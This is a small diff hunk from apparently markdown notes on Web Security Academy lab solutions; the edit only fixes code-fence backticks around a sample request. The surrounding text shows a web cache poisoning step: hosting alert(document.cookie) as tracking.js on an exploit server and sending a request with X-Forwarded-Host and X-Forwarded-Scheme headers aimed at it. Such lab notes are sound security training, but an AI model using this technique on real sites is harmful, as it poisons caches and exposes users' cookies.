@@ -49,12 +49,12 @@
     On exploit-server change the file name to match the path used by the vulnerable response: /resources/js/tracking.js. 
     In body write alert(document.cookie) script.
 
-``
+```
   GET /resources/js/tracking.js HTTP/1.1
   Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
   X-Forwarded-Host: exploit-server.web-security-academy.net/
   X-Forwarded-Scheme: http
-``
+```
 
 ## Targeted web cache poisoning using an unknown header
 
